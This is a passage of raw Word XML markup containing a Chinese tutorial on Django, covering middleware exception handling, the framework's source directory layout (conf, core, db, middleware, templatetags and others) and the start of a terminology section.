    <w:p w14:paraId="399F3113"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这个函数的参数除了一贯的</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对象之外，还包括</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函数抛出的实际的异常对象</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> exception </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2A83F0"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process_exception() 应当返回 None 或 HttpResponse 对象.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19146675"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None , Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将用框架内置的异常处理机制继续处理相应</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAB48EE"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 xml:space="preserve">, Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将使用该</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对象，而短路框架内置的异常处理机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C19B5AA"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以下几章会详细介绍该机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115B277B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="320" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="t2"/>
      <w:bookmarkEnd w:id="56"/>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>三、</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>目录结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710662A9" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F482B8B" wp14:editId="3EBB787F">
            <wp:extent cx="3960638" cy="2546063"/>
            <wp:effectExtent l="0" t="0" r="1905" b="6985"/>
            <wp:docPr id="39" name="图片 39" descr="dsf">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f">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65049" cy="2548898"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D03EA74"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conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A461DC3"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主要有两个作用：</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">1) </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>处理全局配置</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比如数据库、加载的应用、</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> MiddleWare</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>等</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2) </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>urls</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>配置</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就是</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与</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的映射关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF08F78"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contrib (贡献)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBCA8F6"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由</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的开发者贡献的功能模块，不过既然都已经随版本发布，</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就表示是官方的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AAD251"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core</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195324F3"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的核心处理库，包括</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分析、处理请求、缓存等，其中处理请求是核心了，比如处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fastcgi</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>就是由</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wsgi.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BD489C"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db</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69974357"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顾名思义，处理与数据库相关的，就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFF430F"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dispatch (分派，派遣)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBC8A36"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lastRenderedPageBreak/>
        <w:t>其实这不是</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原创，是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pydispatch</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>库，主要处</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理消费者</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工作者模式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250F2BE3"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forms &amp;&amp; newforms &amp;&amp; oldforms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52135704"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处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的表单，不用多介绍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFE0D18"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middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4926FE"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中间件，就是处理HTTP的request和response的，类似插件。</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>比</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如默认的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>common</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件的一个功能：当一个页面没有找对对应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pattern</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>时，</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会自定加上</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重新处理。比如访问</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/blog</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>时，而定义的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pattern</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>‘^blog/$’</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所以找不到对应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pattern</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，会自动再用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/blog/</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>查找，当然前提是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> APPEND_SLASH=True</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04698684"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template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5A17D2"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的模板</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E50B107"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templatetags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A415F0"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处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Application</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tag</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wrapper</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，就是将</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>INSTALLED_APPS</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所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>templatetags</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>目录添加到</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.templatetags</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>目录中，则当使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> {{load blog}}</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>记载</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tag</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>时，就可以使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import django.templatetags.blog </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方式加载了。不过这有一个问题，如果其他</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Application</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>目录中也有</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>blog.py</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这会加载第一个出现</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>blog.py</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tag</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。其实在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中，有许多需要处理重名</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的地方，比如</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>template</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，需要格外小心，这个后续在介绍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EA5B19"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utils</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB5AFC9"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公共库，很多公用的类都在放在这里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B25ACD3"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views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F640FB0"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最基本的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方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBAC8A6" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="t3"/>
      <w:bookmarkEnd w:id="57"/>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>四、</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>术语</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B06FEE"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在应用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
